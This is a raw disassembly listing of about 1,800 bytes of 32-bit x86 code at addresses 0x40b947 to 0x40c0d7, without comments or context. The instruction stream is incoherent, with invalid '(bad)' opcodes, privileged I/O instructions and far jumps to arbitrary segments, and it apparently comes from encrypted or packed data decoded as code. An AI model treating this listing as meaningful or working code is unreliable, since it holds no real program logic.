  40b947:	jmp    0xe0feea9b
  40b94c:	push   cs
  40b94d:	push   ss
  40b94e:	or     al,0x2c
  40b950:	sar    BYTE PTR [edi],cl
  40b952:	ins    DWORD PTR es:[edi],dx
  40b953:	sbb    cl,BYTE PTR [esi+0xb696d74]
  40b959:	sbb    BYTE PTR [esi],al
  40b95b:	inc    esp
  40b95c:	or     al,0x18
  40b95e:	mov    ebx,0xafd43034
  40b963:	fs pop edx
  40b965:	fstp   TBYTE PTR [esi+0x38]
  40b968:	outs   dx,BYTE PTR ds:[esi]
  40b969:	mov    ds:0x9a74eb0e,eax
  40b96e:	push   ebx
  40b96f:	dec    esp
  40b970:	jl     0x40b981
  40b972:	jne    0x40b92a
  40b974:	jp     0x40b911
  40b976:	sbb    edi,DWORD PTR [ebx]
  40b978:	(bad)  
  40b979:	or     al,0x9
  40b97b:	sahf   
  40b97c:	and    dh,BYTE PTR [ebp-0x28]
  40b97f:	add    ebp,DWORD PTR [ecx-0x7b1ddf60]
  40b985:	pop    eax
  40b986:	mov    edi,0x3a4995bc
  40b98b:	call   0xb5d8:0x68e84b97
  40b992:	test   DWORD PTR [ecx],ebx
  40b994:	iret   
  40b995:	icebp  
  40b996:	fnsave [edi+0x4d]
  40b999:	sub    esp,edx
  40b99b:	push   0x6e0f6b72
  40b9a0:	xor    BYTE PTR [ebx-0x3e45a7be],cl
  40b9a6:	xor    eax,0x7c8f6c21
  40b9ab:	imul   ebp,DWORD PTR [ecx+0x7b3d1dde],0xffffff9e
  40b9b2:	cmp    al,0x7e
  40b9b4:	mov    esp,0x28448aba
  40b9b9:	and    esp,eax
  40b9bb:	mov    ds:0x35044b88,eax
  40b9c0:	xor    eax,0xcf90696d
  40b9c5:	xlat   BYTE PTR ds:[ebx]
  40b9c6:	push   ds
  40b9c7:	xor    dh,bl
  40b9c9:	push   esi
  40b9ca:	mov    cl,BYTE PTR [ebx+0x10]
  40b9cd:	dec    ebp
  40b9ce:	lods   eax,DWORD PTR ds:[esi]
  40b9cf:	out    dx,eax
  40b9d0:	pop    edx
  40b9d1:	mov    edx,0x8a1e8a35
  40b9d6:	sbb    eax,0x1c06536
  40b9db:	adc    dh,BYTE PTR [esi+edi*2+0x46]
  40b9df:	sbb    BYTE PTR fs:[eiz*2-0x58826d1],dh
  40b9e7:	stos   BYTE PTR es:[edi],al
  40b9e8:	push   cs
  40b9e9:	call   0xa4e:0xb4d8a7b1
  40b9f0:	retf   0xc6bb
  40b9f3:	mov    ebp,0x5eeb0635
  40b9f8:	mov    al,0x1f
  40b9fa:	cmp    BYTE PTR [ecx-0x3fcf0bad],al
  40ba00:	dec    esi
  40ba01:	js     0x40b9fe
  40ba03:	jg     0x40ba5d
  40ba05:	add    DWORD PTR [ebx-0x3b406835],esi
  40ba0b:	and    BYTE PTR [ebp+0x31d55262],dl
  40ba11:	jne    0x40b997
  40ba13:	out    dx,eax
  40ba14:	scas   eax,DWORD PTR es:[edi]
  40ba15:	xchg   ebx,eax
  40ba16:	pop    edi
  40ba17:	in     eax,dx
  40ba18:	rol    BYTE PTR [edx-0x47],cl
  40ba1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba1c:	xchg   dl,bl
  40ba1e:	lock pop es
  40ba20:	pop    ebx
  40ba21:	fwait
  40ba22:	mov    ecx,0xc2f5e18c
  40ba27:	push   ebx
  40ba28:	xor    al,0x23
  40ba2a:	adc    dl,cl
  40ba2c:	pop    ebx
  40ba2d:	fmul   DWORD PTR [eax+0x2]
  40ba30:	inc    ebx
  40ba31:	int    0xe
  40ba33:	(bad)  
  40ba34:	add    DWORD PTR [ebx],edx
  40ba36:	jae    0x40ba06
  40ba38:	outs   dx,BYTE PTR ds:[esi]
  40ba39:	into   
  40ba3a:	dec    esi
  40ba3b:	mov    es,WORD PTR [edx-0x10]
  40ba3e:	fwait
  40ba3f:	push   ebx
  40ba40:	xchg   BYTE PTR [ebp-0x6f7298b],ah
  40ba46:	jmp    0x40bac5
  40ba48:	jp     0x40baa0
  40ba4a:	int3   
  40ba4b:	retf   
  40ba4c:	mov    dh,0x1f
  40ba4e:	pop    edi
  40ba4f:	cmp    DWORD PTR [ecx-0x31b3e1dc],ebp
  40ba55:	sub    DWORD PTR [eax+0x7c],ebx
  40ba58:	rcl    BYTE PTR [ecx-0x3ec775ff],0xca
  40ba5f:	xacquire xchg BYTE PTR [edi+eax*1+0x5f],dl
  40ba64:	aas    
  40ba65:	dec    ebp
  40ba66:	or     cl,BYTE PTR [edi+0x291eecbc]
  40ba6c:	aam    0x76
  40ba6e:	fidiv  DWORD PTR [edi-0x21]
  40ba71:	mov    ds:0x9e1c8b90,al
  40ba76:	fimul  DWORD PTR [esi]
  40ba78:	in     al,0xcc
  40ba7a:	mov    al,0xda
  40ba7c:	and    DWORD PTR [ebp-0x69ee14f2],eax
  40ba82:	and    eax,0xb16903f5
  40ba87:	test   eax,0xa4e35e5b
  40ba8c:	xor    BYTE PTR [edi],0x3f
  40ba8f:	ja     0x40ba89
  40ba91:	fsubr  QWORD PTR [ebp+eiz*2+0x7ce947c]
  40ba98:	jmp    0x52db:0x29d108e8
  40ba9f:	push   0x18332524
  40baa4:	out    0xbc,eax
  40baa6:	stc    
  40baa7:	out    dx,al
  40baa8:	adc    ah,BYTE PTR [ebp-0x549f6704]
  40baae:	pop    esi
  40baaf:	cmp    ecx,edi
  40bab1:	or     bl,dl
  40bab3:	fwait
  40bab4:	cld    
  40bab5:	mov    edi,0x88ef33da
  40baba:	mov    esi,0x87e3f3e5
  40babf:	push   edx
  40bac0:	retf   
  40bac1:	ins    DWORD PTR es:[edi],dx
  40bac2:	lds    ecx,FWORD PTR [ebx+0x6dc96ec4]
  40bac8:	retf   0x1a74
  40bacb:	jnp    0x40bab4
  40bacd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bace:	lods   eax,DWORD PTR ds:[esi]
  40bacf:	pop    esp
  40bad0:	and    al,0x7
  40bad2:	fstp   TBYTE PTR [edi-0x3a]
  40bad5:	mov    dl,0x5d
  40bad7:	fmul   DWORD PTR [ebx+0x2f]
  40bada:	loopne 0x40baa5
  40badc:	mov    al,0x85
  40bade:	mov    dh,0x61
  40bae0:	push   eax
  40bae1:	push   ecx
  40bae2:	pop    ss
  40bae3:	push   ebx
  40bae4:	mov    bh,BYTE PTR [edi+0x3c]
  40bae7:	cmp    ebp,eax
  40bae9:	sbb    cl,BYTE PTR [ebp+0x8]
  40baec:	push   ebx
  40baed:	xor    ah,BYTE PTR [ebx-0x62]
  40baf0:	ror    al,1
  40baf2:	ins    BYTE PTR es:[edi],dx
  40baf3:	mov    ds:0x89b27f0b,al
  40baf8:	loope  0x40bb48
  40bafa:	pop    ebx
  40bafb:	retf   0xd141
  40bafe:	adc    eax,0xcb50811e
  40bb03:	jmp    0xee3cbdee
  40bb08:	and    eax,0x83d7da3b
  40bb0d:	fistp  WORD PTR [edx+0x42812663]
  40bb13:	pop    eax
  40bb14:	daa    
  40bb15:	pop    ss
  40bb16:	ret    
  40bb17:	xchg   BYTE PTR [ebx],dl
  40bb19:	jg     0x40bb32
  40bb1b:	jne    0x40baba
  40bb1d:	cmp    edi,DWORD PTR [eax+0x5e40e43b]
  40bb23:	or     DWORD PTR [eax],ebx
  40bb25:	xor    eax,eax
  40bb27:	aam    0x8a
  40bb29:	and    al,0x2a
  40bb2b:	arpl   WORD PTR [ebx+0x2],di
  40bb2e:	sub    DWORD PTR [ecx+0x2a],esp
  40bb31:	daa    
  40bb32:	imul   ecx,DWORD PTR [ebp+ecx*8-0x471451b1],0x461f72b7
  40bb3d:	dec    edi
  40bb3e:	xchg   ebp,eax
  40bb3f:	mov    al,ds:0xfb5999a7
  40bb44:	hlt    
  40bb45:	inc    eax
  40bb46:	xchg   BYTE PTR [edx*8-0x43439d0f],dl
  40bb4d:	stos   DWORD PTR es:[edi],eax
  40bb4e:	or     eax,0x16c790df
  40bb53:	mov    esp,0x1431cf52
  40bb58:	(bad)  
  40bb59:	mov    esp,0xf6343a00
  40bb5e:	xchg   edx,eax
  40bb5f:	push   ebx
  40bb60:	mov    al,0xd
  40bb62:	popw   es
  40bb64:	jne    0x40bb42
  40bb66:	xor    BYTE PTR [edx+0x77],dl
  40bb69:	cwde   
  40bb6a:	jmp    0x7e83:0x98c53577
  40bb71:	push   ebp
  40bb72:	lods   al,BYTE PTR ds:[esi]
  40bb73:	stos   DWORD PTR es:[edi],eax
  40bb74:	sbb    eax,0x9db38d3f
  40bb79:	pop    ecx
  40bb7a:	repz push ebx
  40bb7c:	adc    DWORD PTR [esi],eax
  40bb7e:	add    ebx,DWORD PTR [esi]
  40bb80:	(bad)  
  40bb81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb82:	test   DWORD PTR [edi+ebp*4+0x66019dcb],esi
  40bb89:	and    eax,0x3effcc6d
  40bb8e:	xor    ch,ah
  40bb90:	outs   dx,DWORD PTR ds:[esi]
  40bb91:	shr    BYTE PTR ds:0x312755ad,1
  40bb97:	out    dx,al
  40bb98:	mov    esp,0xc46f34e9
  40bb9d:	push   es
  40bb9e:	call   0xfd06:0x5097b80
  40bba5:	push   esp
  40bba6:	sub    eax,0xba07752f
  40bbab:	data16 rol ah,cl
  40bbae:	test   DWORD PTR [edx+0x3c],0xa255df58
  40bbb5:	stos   BYTE PTR es:[edi],al
  40bbb6:	sub    eax,0x9d4b80db
  40bbbb:	mov    ch,0x59
  40bbbd:	adc    DWORD PTR [edi+0x2f],esi
  40bbc0:	jae    0x40bba9
  40bbc2:	jle    0x40bc17
  40bbc4:	inc    ebp
  40bbc5:	dec    BYTE PTR [ecx+eax*2-0x16b1121]
  40bbcc:	mov    bl,0xa3
  40bbce:	das    
  40bbcf:	xchg   esp,eax
  40bbd0:	sub    esp,DWORD PTR [eax-0x5d]
  40bbd3:	cld    
  40bbd4:	pavgw  mm1,QWORD PTR [eax]
  40bbd7:	push   eax
  40bbd8:	sub    al,0x13
  40bbda:	es js  0x40bb66
  40bbdd:	sbb    BYTE PTR cs:[esi-0x73],ch
  40bbe1:	int3   
  40bbe2:	outs   dx,BYTE PTR ds:[esi]
  40bbe3:	mov    ds:0xfa674d85,al
  40bbe8:	nop
  40bbe9:	and    BYTE PTR [ecx],dh
  40bbeb:	mov    esi,0x89fe4556
  40bbf0:	loopne 0x40bc57
  40bbf2:	(bad)  [ebp+0x57]
  40bbf5:	imul   edx,DWORD PTR [edx],0xd2ea5999
  40bbfb:	cmp    DWORD PTR [edi],0x8672a89a
  40bc01:	inc    ecx
  40bc02:	pop    eax
  40bc03:	je     0x40bc3c
  40bc05:	jno    0x40bc07
  40bc07:	fabs   
  40bc09:	sbb    bl,BYTE PTR [esi]
  40bc0b:	add    DWORD PTR [ebp-0x6925d0aa],esi
  40bc11:	outs   dx,DWORD PTR ds:[esi]
  40bc12:	not    BYTE PTR ds:0xe17a0e00
  40bc18:	push   ecx
  40bc19:	mov    esi,0x1bec637d
  40bc1e:	test   DWORD PTR [ecx],0xa36ab1de
  40bc24:	or     edi,esp
  40bc26:	adc    al,0xda
  40bc28:	pop    ecx
  40bc29:	sub    dl,ch
  40bc2b:	or     bl,BYTE PTR [esi+0x1df5bfd2]
  40bc31:	pop    ebx
  40bc32:	xchg   ebp,eax
  40bc33:	test   al,0x18
  40bc35:	adc    edx,DWORD PTR [esi+0x72]
  40bc38:	jecxz  0x40bc2c
  40bc3a:	inc    ebx
  40bc3b:	sub    BYTE PTR [edi],dh
  40bc3d:	pop    esp
  40bc3e:	shl    BYTE PTR [esi+eiz*2+0x5c2cf3b5],cl
  40bc45:	adc    BYTE PTR [ecx-0x53],cl
  40bc48:	sub    DWORD PTR [esi-0x42],0x1c2de081
  40bc4f:	fcomp  QWORD PTR es:[esi]
  40bc52:	popf   
  40bc53:	gs cmp al,0x91
  40bc56:	cmp    bh,bl
  40bc58:	mov    al,ds:0x4e042eed
  40bc5d:	jne    0x40bca8
  40bc5f:	jmp    0x55584289
  40bc64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc65:	daa    
  40bc66:	cmp    DWORD PTR [eax+edi*8-0x41acf3df],0xbccc64a8
  40bc71:	xor    dh,cl
  40bc73:	jle    0x40bc1c
  40bc75:	out    0x14,al
  40bc77:	call   0xf869ecc0
  40bc7c:	pop    ss
  40bc7d:	fdivr  st,st(7)
  40bc7f:	jecxz  0x40bc94
  40bc81:	xor    al,0xc9
  40bc83:	jnp    0x40bc6c
  40bc85:	mov    edx,0xf9e3c94a
  40bc8a:	retf   0x7bbc
  40bc8d:	out    0xe7,eax
  40bc8f:	into   
  40bc90:	in     al,0x72
  40bc92:	xchg   BYTE PTR [eax+0x62],bl
  40bc95:	ins    BYTE PTR es:[edi],dx
  40bc96:	test   DWORD PTR [ebp+eax*2+0x12],edi
  40bc9a:	les    esi,FWORD PTR ds:0xcf4990a0
  40bca0:	mov    BYTE PTR [ecx+0x5b470865],0x31
  40bca7:	div    DWORD PTR [esi+0x17]
  40bcaa:	das    
  40bcab:	sbb    BYTE PTR [eax-0x4ef33203],ah
  40bcb1:	add    al,cl
  40bcb3:	aad    0x4f
  40bcb5:	ins    BYTE PTR es:[edi],dx
  40bcb6:	icebp  
  40bcb7:	and    esp,ebx
  40bcb9:	mov    bl,0xfd
  40bcbb:	loope  0x40bc3f
  40bcbd:	cdq    
  40bcbe:	sub    DWORD PTR [ecx-0x3f],edi
  40bcc1:	fisubr DWORD PTR [ebp-0x17eba471]
  40bcc7:	push   ds
  40bcc8:	stos   BYTE PTR es:[edi],al
  40bcc9:	outs   dx,DWORD PTR ds:[esi]
  40bcca:	push   0x45
  40bccc:	repz and cl,BYTE PTR [ebx-0x3d6236ca]
  40bcd3:	das    
  40bcd4:	inc    edi
  40bcd5:	(bad)  
  40bcd6:	fsin   
  40bcd8:	std    
  40bcd9:	sbb    DWORD PTR [edx-0x1e],ebp
  40bcdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcdd:	jmp    0xaab80689
  40bce2:	xchg   esi,eax
  40bce3:	add    ah,BYTE PTR [eax-0x34]
  40bce6:	js     0x40bd3d
  40bce8:	or     bl,ch
  40bcea:	add    edx,DWORD PTR [ebx-0x1a]
  40bced:	push   esp
  40bcee:	jmp    0x5b3f:0x13973d94
  40bcf5:	pop    esp
  40bcf6:	sub    esp,edi
  40bcf8:	mov    edi,0xe1cd6ef6
  40bcfd:	and    esp,DWORD PTR [edx*4-0x5d92b94e]
  40bd04:	xor    esi,esi
  40bd06:	sbb    BYTE PTR [ebx],al
  40bd08:	jmp    0x40bcbb
  40bd0a:	mov    es,WORD PTR [esi-0x7665b6e0]
  40bd10:	ret    
  40bd11:	mov    bh,0x41
  40bd13:	sbb    eax,0xe035aba9
  40bd18:	lahf   
  40bd19:	push   0x65
  40bd1b:	ja     0x40bd8e
  40bd1d:	ret    
  40bd1e:	(bad)  
  40bd1f:	enter  0xdffe,0x95
  40bd23:	dec    edx
  40bd24:	jmp    0xdb3b:0xcfe9da9d
  40bd2b:	jnp    0x40bd90
  40bd2d:	fisub  WORD PTR [ebx]
  40bd2f:	std    
  40bd30:	or     eax,0x699e8679
  40bd35:	aas    
  40bd36:	shl    DWORD PTR [edx],1
  40bd38:	pop    edi
  40bd39:	or     ch,0x70
  40bd3c:	mov    ah,0x87
  40bd3e:	mov    eax,0x15b246c7
  40bd43:	arpl   WORD PTR [edi],sp
  40bd45:	mov    dl,BYTE PTR [edx-0x7a]
  40bd48:	sub    eax,0xbc606f1
  40bd4d:	jbe    0x40bd05
  40bd4f:	dec    ebp
  40bd50:	fmul   QWORD PTR [esi+0x3f]
  40bd53:	jno    0x40bce1
  40bd55:	jp     0x40bdc1
  40bd57:	data16 and BYTE PTR [ebx-0x27],bl
  40bd5b:	xor    esp,ebx
  40bd5d:	sbb    dh,dl
  40bd5f:	ja     0x40bd62
  40bd61:	jbe    0x40bd3a
  40bd63:	cmp    eax,0x90c8730a
  40bd68:	icebp  
  40bd69:	fldcw  WORD PTR [edx+0x53]
  40bd6c:	mov    ch,0xcf
  40bd6e:	fst    QWORD PTR [ebx]
  40bd70:	push   ebx
  40bd71:	ins    BYTE PTR es:[edi],dx
  40bd72:	aaa    
  40bd73:	cmp    ah,BYTE PTR [esi]
  40bd75:	pop    DWORD PTR [ecx+esi*8-0x73]
  40bd79:	pop    ebx
  40bd7a:	mov    ch,0xf7
  40bd7c:	pop    edx
  40bd7d:	ret    
  40bd7e:	bound  edx,QWORD PTR [eax+0x9]
  40bd81:	scas   eax,DWORD PTR es:[edi]
  40bd82:	test   bl,ah
  40bd84:	fadd   QWORD PTR [ecx-0x6]
  40bd87:	cmp    al,0x3b
  40bd89:	sub    ebp,DWORD PTR [edi-0x36cd90c1]
  40bd8f:	aad    0x77
  40bd91:	adc    eax,0x796ecf47
  40bd96:	into   
  40bd97:	pop    edx
  40bd98:	lahf   
  40bd99:	push   ss
  40bd9a:	xor    bl,BYTE PTR [esi-0x36]
  40bd9d:	pop    esp
  40bd9e:	repnz loop 0x40bdda
  40bda1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bda2:	ds test ah,bl
  40bda5:	mov    eax,ds:0x65ad6a86
  40bdaa:	mov    bl,0x0
  40bdac:	mov    esi,0x5c943995
  40bdb1:	xor    ch,dh
  40bdb3:	xor    al,0x7b
  40bdb5:	ror    DWORD PTR [edi+0x34],1
  40bdb8:	leave  
  40bdb9:	repz ds loope 0x40bde3
  40bdbd:	adc    edx,DWORD PTR [ebp-0x788dc931]
  40bdc3:	push   esi
  40bdc4:	test   al,0xd5
  40bdc6:	adc    al,ah
  40bdc8:	and    eax,0x6dcd74a8
  40bdcd:	add    al,0x7d
  40bdcf:	mov    al,0x42
  40bdd1:	aas    
  40bdd2:	inc    ebp
  40bdd3:	push   ebp
  40bdd4:	int3   
  40bdd5:	(bad)  
  40bdd7:	inc    ecx
  40bdd8:	add    eax,0x8c2e2741
  40bddd:	rcl    BYTE PTR [eax+0x376c9872],1
  40bde3:	adc    al,0xd0
  40bde5:	int    0xe7
  40bde7:	clc    
  40bde8:	push   edx
  40bde9:	dec    ebx
  40bdea:	data16 xlat BYTE PTR ds:[ebx]
  40bdec:	into   
  40bded:	fidivr DWORD PTR [eax]
  40bdef:	mov    DWORD PTR [eax-0x48797a22],ebp
  40bdf5:	std    
  40bdf6:	shl    DWORD PTR [esi-0x30ee65bd],cl
  40bdfc:	arpl   bx,ax
  40bdfe:	or     edi,DWORD PTR [ebp+edx*1-0x26]
  40be02:	retf   0xd12c
  40be05:	call   0x355b17f5
  40be0a:	leave  
  40be0b:	mov    eax,0xf3404b6d
  40be10:	cmc    
  40be11:	stc    
  40be12:	sbb    al,0xcb
  40be14:	or     al,0x66
  40be16:	xchg   ebx,eax
  40be17:	mov    DWORD PTR [edi+0x5c3bd4d7],esp
  40be1d:	lods   al,BYTE PTR ds:[esi]
  40be1e:	fiadd  WORD PTR [esi+ebx*8-0x4d]
  40be22:	shl    eax,0x31
  40be25:	loopne 0x40bdbb
  40be27:	inc    ebp
  40be28:	mov    esi,0xd67ee750
  40be2d:	call   0xb484:0x36f4fc70
  40be34:	push   0x1a
  40be36:	cmp    ecx,DWORD PTR [ebx-0x65dc0d75]
  40be3c:	fsubr  QWORD PTR [esi]
  40be3e:	stos   DWORD PTR es:[edi],eax
  40be3f:	mov    ah,0x9a
  40be41:	(bad)  
  40be42:	xchg   ebp,eax
  40be43:	jmp    0x40be0b
  40be45:	jg     0x40be4a
  40be47:	fdivr  DWORD PTR [edx]
  40be49:	lahf   
  40be4a:	adc    DWORD PTR [edi+0x6a],ebx
  40be4d:	clc    
  40be4e:	inc    ebp
  40be4f:	into   
  40be50:	push   edi
  40be51:	test   ebx,ecx
  40be53:	mov    al,0x99
  40be55:	sbb    BYTE PTR [ecx-0x2e9d6517],ch
  40be5b:	cld    
  40be5c:	sub    al,0x93
  40be5e:	mov    edi,0xd0ce9e9f
  40be63:	jecxz  0x40be89
  40be65:	sub    edx,DWORD PTR [edx-0xc]
  40be68:	sub    dl,BYTE PTR [ecx-0x5a]
  40be6b:	jg     0x40bec4
  40be6d:	mov    edi,0xe1dfa7e6
  40be72:	adc    eax,0xec78c4f2
  40be77:	cmp    al,0x53
  40be79:	push   esp
  40be7a:	and    bl,0xa2
  40be7d:	ret    
  40be7e:	shl    DWORD PTR [edx+0x1f],0xb4
  40be82:	loopne 0x40beff
  40be84:	sub    ah,al
  40be86:	jb     0x40be56
  40be88:	mov    ah,0xa3
  40be8a:	cdq    
  40be8b:	clc    
  40be8c:	xor    dh,BYTE PTR [edx]
  40be8e:	jbe    0x40beb0
  40be90:	and    edi,DWORD PTR [eax+0x7b]
  40be93:	enter  0x5e46,0x47
  40be97:	popf   
  40be98:	mov    ah,0x30
  40be9a:	cs sub eax,0xb4646166
  40bea0:	xor    BYTE PTR [ebx+0x7a],dh
  40bea3:	mov    esi,?
  40bea5:	nop
  40bea6:	dec    esp
  40bea7:	je     0x40beba
  40bea9:	pusha  
  40beaa:	repnz stos BYTE PTR es:[edi],al
  40beac:	scas   eax,DWORD PTR es:[edi]
  40bead:	das    
  40beae:	jmp    0xfb627929
  40beb3:	or     al,0xa2
  40beb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40beb6:	cmp    eax,0xb1d1d471
  40bebb:	jo     0x40bef2
  40bebd:	jno    0x40bec6
  40bebf:	and    esi,DWORD PTR [esp+eiz*4+0x63af7e8c]
  40bec6:	std    
  40bec7:	popa   
  40bec8:	sub    al,0xf8
  40beca:	jne    0x40bebc
  40becc:	ret    0xd04
  40becf:	dec    ecx
  40bed0:	add    al,BYTE PTR [ebp+edi*2+0x11]
  40bed4:	or     esi,edx
  40bed6:	mov    esi,0xa551033b
  40bedb:	test   eax,esi
  40bedd:	(bad)  
  40bede:	pop    ecx
  40bedf:	adc    eax,0xa79e2d32
  40bee4:	loopne 0x40bebf
  40bee6:	push   edi
  40bee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bee8:	mov    bl,0x7
  40beea:	in     al,0xac
  40beec:	xchg   ebp,eax
  40beed:	(bad)  
  40beee:	xor    dl,BYTE PTR [ebx]
  40bef0:	imul   eax,DWORD PTR [eax-0x2c],0xffffffc0
  40bef4:	cmp    dh,BYTE PTR [edi+ebx*2]
  40bef7:	xchg   esi,eax
  40bef8:	push   ebx
  40bef9:	pop    ebp
  40befa:	sbb    DWORD PTR [ecx+0x3feb2b0c],edx
  40bf00:	add    eax,0x9d25cb86
  40bf05:	inc    edi
  40bf06:	pop    ds
  40bf07:	add    dh,bh
  40bf09:	nop
  40bf0a:	dec    esi
  40bf0b:	add    BYTE PTR [ecx+0x735cf7cb],dh
  40bf11:	lea    ebp,[edx-0x5c626299]
  40bf17:	fwait
  40bf18:	loopne 0x40bf90
  40bf1a:	or     edi,edx
  40bf1c:	rcl    edi,1
  40bf1e:	pop    esp
  40bf1f:	lods   al,BYTE PTR ds:[esi]
  40bf20:	ror    dl,cl
  40bf22:	ja     0x40bf75
  40bf24:	adc    cl,BYTE PTR [esi]
  40bf26:	loopne 0x40bec6
  40bf28:	add    al,0x15
  40bf2a:	loopne 0x40bf74
  40bf2c:	adc    BYTE PTR [bx+di+0x1a77],dh
  40bf31:	pop    edx
  40bf32:	cwde   
  40bf33:	pop    esp
  40bf34:	sar    bh,0x76
  40bf37:	push   edx
  40bf38:	std    
  40bf39:	outs   dx,BYTE PTR ds:[esi]
  40bf3a:	push   esi
  40bf3b:	sbb    ch,BYTE PTR [edi]
  40bf3d:	pop    esi
  40bf3e:	push   ebx
  40bf3f:	and    eax,DWORD PTR [ecx+esi*1-0xe]
  40bf43:	jbe    0x40bed9
  40bf45:	adc    ebx,ecx
  40bf47:	clc    
  40bf48:	inc    ebx
  40bf49:	pop    ds
  40bf4a:	cdq    
  40bf4b:	in     eax,0xa8
  40bf4d:	jmp    0x40bfb0
  40bf4f:	push   0x66
  40bf51:	push   ebx
  40bf52:	cld    
  40bf53:	push   ds
  40bf54:	cmp    DWORD PTR [ebp+0x69],ebp
  40bf57:	dec    ecx
  40bf58:	call   0x1b58:0x36fe556e
  40bf5f:	mov    al,0xb8
  40bf61:	leave  
  40bf62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf63:	test   esi,ebx
  40bf65:	cmp    cl,BYTE PTR [edi]
  40bf67:	add    eax,esp
  40bf69:	adc    BYTE PTR [edx],ah
  40bf6b:	push   ds
  40bf6c:	sub    esp,DWORD PTR ds:0x13cac501
  40bf72:	lea    ebp,[esp+eax*4]
  40bf75:	mov    DWORD PTR [edi-0x3e],esi
  40bf78:	dec    edi
  40bf79:	fisub  WORD PTR ds:0x461ba947
  40bf7f:	pop    edi
  40bf80:	xchg   edx,eax
  40bf81:	sub    bl,dl
  40bf83:	stos   BYTE PTR es:[edi],al
  40bf84:	push   esi
  40bf85:	inc    ecx
  40bf86:	jo     0x40bff5
  40bf88:	leave  
  40bf89:	pop    ebp
  40bf8a:	cmp    eax,0xdd427f74
  40bf8f:	lahf   
  40bf90:	mov    esp,0x119f1fd6
  40bf95:	jmp    0x995e11ac
  40bf9a:	cmp    esi,ebp
  40bf9c:	bound  esp,QWORD PTR [ecx]
  40bf9e:	or     cl,BYTE PTR [eax+ecx*8+0x50]
  40bfa2:	outs   dx,BYTE PTR ds:[esi]
  40bfa3:	imul   ecx,ecx,0xf437e358
  40bfa9:	iret   
  40bfaa:	mov    ?,esp
  40bfac:	ja     0x40bfcf
  40bfae:	sub    eax,0xf1f553cc
  40bfb3:	mov    ecx,0x8d329e7
  40bfb8:	cmp    DWORD PTR [ebp+eiz*4+0x60e83c4d],eax
  40bfbf:	xchg   edx,eax
  40bfc0:	push   ecx
  40bfc1:	das    
  40bfc2:	dec    ebp
  40bfc3:	sbb    ecx,edx
  40bfc5:	dec    ebx
  40bfc6:	sub    esi,DWORD PTR [ecx+ecx*4-0x14]
  40bfca:	mov    eax,ds:0x849ba5a8
  40bfcf:	ja     0x40bf5c
  40bfd1:	jp     0x40c02d
  40bfd3:	enter  0x928,0x2
  40bfd7:	ret    0xb158
  40bfda:	jmp    0x40bf8f
  40bfdc:	mov    ah,0xb9
  40bfde:	out    0xed,al
  40bfe0:	or     eax,0xe4d8d1ea
  40bfe5:	mov    cl,0x85
  40bfe7:	enter  0x7552,0xd
  40bfeb:	repz add ch,BYTE PTR [edi]
  40bfee:	mov    ecx,0xcea38c1b
  40bff3:	add    ebx,esi
  40bff5:	iret   
  40bff6:	ja     0x40c060
  40bff8:	out    dx,eax
  40bff9:	arpl   WORD PTR [ecx+0x5681c83c],di
  40bfff:	push   esi
  40c000:	jnp    0x40c05e
  40c002:	pushf  
  40c003:	push   ecx
  40c004:	test   eax,0x40863f1e
  40c009:	jle    0x40c035
  40c00b:	xchg   al,bl
  40c00d:	push   0xffffffd2
  40c00f:	dec    edx
  40c010:	adc    al,0x8c
  40c012:	lods   al,BYTE PTR ds:[esi]
  40c013:	mov    esi,0xe324cb04
  40c018:	push   eax
  40c019:	sbb    eax,0x1e2ebed3
  40c01e:	loope  0x40c07d
  40c020:	xor    BYTE PTR [ecx+0x4d],dh
  40c023:	test   DWORD PTR [ebp-0x3fae873e],0x76c47669
  40c02d:	in     eax,0x83
  40c02f:	mov    ch,0xb5
  40c031:	sti    
  40c032:	adc    BYTE PTR [ecx],dh
  40c034:	cs sbb eax,0x7cd23504
  40c03a:	push   edx
  40c03b:	push   edi
  40c03c:	push   ds
  40c03d:	cs out dx,al
  40c03f:	dec    esi
  40c040:	(bad)  
  40c041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c042:	xor    bh,dh
  40c044:	jns    0x40bfd3
  40c046:	add    al,0xe1
  40c048:	cmp    DWORD PTR [edx-0xf1efbd0],esi
  40c04e:	in     eax,dx
  40c04f:	jle    0x40bff8
  40c051:	in     al,dx
  40c052:	ss push ss
  40c054:	mov    eax,0x6dd64c7e
  40c059:	xor    edi,esp
  40c05b:	outs   dx,BYTE PTR ds:[esi]
  40c05c:	(bad)  
  40c05d:	fld    QWORD PTR ds:0x72df8c83
  40c063:	stos   BYTE PTR es:[edi],al
  40c064:	mov    al,ds:0x18a96490
  40c069:	jmp    0x40c04f
  40c06b:	fmul   DWORD PTR [eax-0x73]
  40c06e:	dec    ebp
  40c06f:	sbb    al,0x88
  40c071:	fsub   QWORD PTR [ebx-0x229984c5]
  40c077:	rcr    edi,cl
  40c079:	div    DWORD PTR [ebp-0x5bce3e24]
  40c07f:	call   0x2dce7bf9
  40c084:	loope  0x40c068
  40c086:	or     DWORD PTR [ecx-0x3e5e4229],edi
  40c08c:	pushf  
  40c08d:	popa   
  40c08e:	cmp    DWORD PTR [edx+0x52a00dc0],0x2c575ca2
  40c098:	test   BYTE PTR [ecx-0x2a1adb3e],ch
  40c09e:	mov    al,ds:0x4afacba6
  40c0a3:	mov    al,ds:0x52222c0f
  40c0a8:	xor    al,0xba
  40c0aa:	sub    al,0xf9
  40c0ac:	mov    edi,0x162fd00f
  40c0b1:	adc    ah,ch
  40c0b3:	addr16 out dx,eax
  40c0b5:	mov    ah,0x9c
  40c0b7:	cli    
  40c0b8:	and    eax,0xdd7236c0
  40c0bd:	mov    esi,0x17c6a8b5
  40c0c2:	ins    DWORD PTR es:[edi],dx
  40c0c3:	and    DWORD PTR [ecx+edi*2+0x19],eax
  40c0c7:	mov    al,ds:0x7cde380c
  40c0cc:	or     eax,0x79c6b759
  40c0d1:	mov    ds,WORD PTR [eax]
  40c0d3:	and    al,ch
  40c0d5:	jno    0x40c155
  40c0d7:	sbb    edx,DWORD PTR ds:0x655ae643
